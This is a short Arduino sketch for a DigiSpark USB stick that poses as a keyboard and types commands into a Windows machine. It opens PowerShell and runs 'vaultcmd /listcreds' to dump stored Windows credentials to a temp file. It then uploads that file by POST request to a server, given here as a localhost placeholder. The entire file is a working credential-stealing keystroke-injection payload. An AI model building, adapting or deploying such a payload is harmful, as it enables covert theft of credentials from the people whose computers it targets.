#include "DigiKeyboard.h"

void setup() {
  // Wait for the machine to detect the DigiSpark, then send a wake-up signal
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // Allow for full keyboard use, then open the Windows run dialog
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_RIGHT); // If in VirtualBox, will allow for left CTRL usage
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Use the run dialog to open a Powershell window
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Run vaultcmd to list the credentials in it and redirect the results to a .tmp file
  DigiKeyboard.print("vaultcmd /listcreds > C:\\temp.tmp");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Send that tmp file to the server via a POST request
  DigiKeyboard.print("Invoke-WebRequest -Uri http://127.0.0.1:8000 -Method Post -InFile C:\\temp.tmp");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}

void loop() {
  
}
